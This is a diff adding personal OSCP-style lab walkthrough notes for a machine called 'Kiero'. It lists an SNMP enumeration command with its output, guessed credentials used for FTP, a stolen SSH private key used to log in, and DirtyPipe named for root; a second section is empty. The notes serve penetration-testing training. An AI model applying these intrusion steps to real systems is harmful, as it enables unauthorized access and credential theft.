@@ -106,6 +106,57 @@ On bloodhound, since there are SVC accounts, kerberoast DC01.
 
 Get kerb hashes and crack with john for creds
 
+# Steps to Kiero
+### User flag
+
+UDP snmp open
+
+[[Synced OSCP Notes/Tools/SNMP|SNMP]]
+
+┌──(kali㉿kali)-[~/Desktop/PEN200/OSCPB/Kiero]
+└─$ snmpwalk -v2c -c public 192.168.162.149 .1.3.6.1.4.1.8072.1.3
+iso.3.6.1.4.1.8072.1.3.2.1.0 = INTEGER: 1
+iso.3.6.1.4.1.8072.1.3.2.2.1.2.5.82.69.83.69.84 = STRING: "./home/john/RESET_PASSWD"
+iso.3.6.1.4.1.8072.1.3.2.2.1.3.5.82.69.83.69.84 = ""
+iso.3.6.1.4.1.8072.1.3.2.2.1.4.5.82.69.83.69.84 = ""
+iso.3.6.1.4.1.8072.1.3.2.2.1.5.5.82.69.83.69.84 = INTEGER: 5
+iso.3.6.1.4.1.8072.1.3.2.2.1.6.5.82.69.83.69.84 = INTEGER: 1
+iso.3.6.1.4.1.8072.1.3.2.2.1.7.5.82.69.83.69.84 = INTEGER: 1
+iso.3.6.1.4.1.8072.1.3.2.2.1.20.5.82.69.83.69.84 = INTEGER: 4
+iso.3.6.1.4.1.8072.1.3.2.2.1.21.5.82.69.83.69.84 = INTEGER: 1
+iso.3.6.1.4.1.8072.1.3.2.3.1.1.5.82.69.83.69.84 = STRING: "Resetting password of kiero to the default value"
+iso.3.6.1.4.1.8072.1.3.2.3.1.2.5.82.69.83.69.84 = STRING: "Resetting password of kiero to the default value"
+iso.3.6.1.4.1.8072.1.3.2.3.1.3.5.82.69.83.69.84 = INTEGER: 1
+iso.3.6.1.4.1.8072.1.3.2.3.1.4.5.82.69.83.69.84 = INTEGER: 0
+iso.3.6.1.4.1.8072.1.3.2.4.1.2.5.82.69.83.69.84.1 = STRING: "Resetting password of kiero to the default value"
+
+
+and find kiero username. means kiero:kiero
+
+Gain access to ftp using those creds. Download id_rsa inside
+
+chmod 600 id_rsa and ssh -i id_rsa john@target and gain john shell. local.txt on his user dir
+
+### Root flag
+
+Can't sudo -l due to no pw
+
+Linpeas shows dirtypipe kernel exploit
+
+Get rootz /root/proof.txt
+
+# Steps to Berlin
+### User flag
+
+
+
+### Root flag
+
+
+
+
+
+
 
 
 
